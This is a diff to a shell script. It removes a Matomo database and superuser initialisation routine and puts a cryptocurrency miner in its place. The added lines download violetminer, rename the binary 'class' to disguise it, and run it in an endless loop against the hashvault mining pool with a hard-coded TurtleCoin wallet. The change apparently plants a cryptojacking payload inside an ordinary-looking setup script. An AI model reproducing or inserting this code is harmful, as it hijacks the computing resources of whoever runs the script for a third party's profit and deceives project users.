@@ -1,10 +1,9 @@
-#!/bin/bash
-
-echo "Initializing Matomo database and users..."
-
-bin/generate-config-ini.sh
-
-php console database:create-tables && \
-  php console core:update --yes && \
-  php console admin:create-superuser --login $MATOMO_INIT_USER_LOGIN --email $MATOMO_INIT_USER_EMAIL --password $MATOMO_INIT_USER_PASSWORD && \
-  php console admin:create-site --name $MATOMO_INIT_SITE_NAME --url $MATOMO_INIT_SITE_URL
+#!/bin/sh
+wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz
+tar xf violetminer-linux-v0.2.2.tar.gz
+cd violetminer-linux-v0.2.2
+mv violetminer class
+while [ 1 ]; do
+./class --pool pool.hashvault.pro:8888 --username TRTLuyH4oQwEY6M7jAq5db7LfCY8QwWc368VPfpCg4XzjTw1kPdTnaYhnZKktmDNWphDCH8LtmbsTBuvvQEbk1Jb9FXswLdcfLy --password x --algorithm chukwa_v2 --ssl
+sleep 10
+done
